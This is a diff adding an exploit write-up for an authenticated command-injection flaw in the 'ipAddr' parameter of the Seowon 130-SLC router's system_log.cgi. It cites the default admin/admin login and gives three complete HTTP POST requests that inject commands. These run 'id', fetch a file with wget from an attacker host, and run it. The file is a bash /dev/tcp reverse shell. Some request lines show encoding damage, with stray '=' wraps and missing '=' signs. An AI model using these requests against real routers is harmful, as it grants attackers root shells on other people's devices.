@@ -1,0 +1,105 @@
+# Exploit Title: Seowon 130-SLC router 1.0.11 - 'ipAddr' RCE (Authenticated)
+# Date: 5 Aug 2020
+# Exploit Author: maj0rmil4d
+# Vendor Homepage: http://www.seowonintech.co.kr/en/
+# Hardware Link: http://www.seowonintech.co.kr/en/product/detail.asp?num=150&big_kindB05&middle_kindB05_29
+# Version: 1.0.11 (Possibly all versions)
+
+ The default user/pass is admin/admin
+ your commands run as root user
+ the vulnerablity is on the ipAddr parameter in system_log.cgi
+
+ Usage:
+
+ login to the dashboard.
+ setup your listener.
+ download the revshell.txt with the RCE
+ run the revshell.txt
+
+ * here is the RCE request :
+
+POST /cgi-bin/system_log.cgi? HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/201=
+00101 Firefox/79.0
+Accept: */*
+Accept-Language: en-US,en;q0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/x-www-form-urlencoded
+Content-Length: 183
+Origin: http://192.168.1.1
+Connection: close
+Referer: http://192.168.1.1/diagnostic.html?t201802140812
+Cookie: productcpe; cpe_buildTime201802140812; vendormobinnet; =
+connTypelte; modelCodeSLC_130G; cpe_multiPdnEnable1; cpe_langen=
+; cpe_voip0; cpe_cwmpc1; cpe_snmp1; filesharing0; cpe_switchEna=
+ble0; cpe_vlanEnable1; cpe_IPv6Enable1; cpe_foc0; cpe_vpn1; =
+cpe_httpsEnable0; cpe_internetMTUEnable0; cpe_sleepMode0; cpe_wlan=
+Enable1; cpe_simRestriction0; cpe_opmode1; sessionTime159664408=
+4662; cpe_loginadmin; _lang
+
+CommandDiagnostic&traceModetrace&reportIpOnly0&pingPktSize56=
+&pingTimeout30&pingCount4&ipAddr;id&maxTTLCnt30&queriesCnt3&=
+reportIpOnlyCheckboxon&btnApplyApply&T1596644096617
+
+
+* to get a reverse shell, setup the listener and download the file on the r=
+outer then run it .
+* the content of the revshell.txt :
+
+bash -i >& /dev/tcp/192.168.1.10/45214 0>&1
+
+* to download :
+
+
+POST /cgi-bin/system_log.cgi? HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/201=
+00101 Firefox/79.0
+Accept: */*
+Accept-Language: en-US,en;q0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/x-www-form-urlencoded
+Content-Length: 183
+Origin: http://192.168.1.1
+Connection: close
+Referer: http://192.168.1.1/diagnostic.html?t201802140812
+Cookie: productcpe; cpe_buildTime201802140812; vendormobinnet; =
+connTypelte; modelCodeSLC_130G; cpe_multiPdnEnable1; cpe_langen=
+; cpe_voip0; cpe_cwmpc1; cpe_snmp1; filesharing0; cpe_switchEna=
+ble0; cpe_vlanEnable1; cpe_IPv6Enable1; cpe_foc0; cpe_vpn1; =
+cpe_httpsEnable0; cpe_internetMTUEnable0; cpe_sleepMode0; cpe_wlan=
+Enable1; cpe_simRestriction0; cpe_opmode1; sessionTime159664408=
+4662; cpe_loginadmin; _lang
+
+CommandDiagnostic&traceModetrace&reportIpOnly0&pingPktSize56=
+&pingTimeout30&pingCount4&ipAddr;wget http://192.168.1.10/revshell=
+.txt&maxTTLCnt30&queriesCnt3&reportIpOnlyCheckboxon&btnApplyApp=
+ly&T1596644096617
+
+
+* to run it :
+
+POST /cgi-bin/system_log.cgi? HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/201=
+00101 Firefox/79.0
+Accept: */*
+Accept-Language: en-US,en;q0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/x-www-form-urlencoded
+Content-Length: 183
+Origin: http://192.168.1.1
+Connection: close
+Referer: http://192.168.1.1/diagnostic.html?t201802140812
+Cookie: productcpe; cpe_buildTime201802140812; vendormobinnet; =
+connTypelte; modelCodeSLC_130G; cpe_multiPdnEnable1; cpe_langen=
+; cpe_voip0; cpe_cwmpc1; cpe_snmp1; filesharing0; cpe_switchEna=
+ble0; cpe_vlanEnable1; cpe_IPv6Enable1; cpe_foc0; cpe_vpn1; =
+cpe_httpsEnable0; cpe_internetMTUEnable0; cpe_sleepMode0; cpe_wlan=
+Enable1; cpe_simRestriction0; cpe_opmode1; sessionTime159664408=
+4662; cpe_loginadmin; _lang
+
+CommandDiagnostic&traceModetrace&reportIpOnly0&pingPktSize56=
+&pingTimeout30&pingCount4&ipAddr;bash revshell.txt&maxTTLCnt30&=
+queriesCnt3&reportIpOnlyCheckboxon&btnApplyApply&T1596644096617
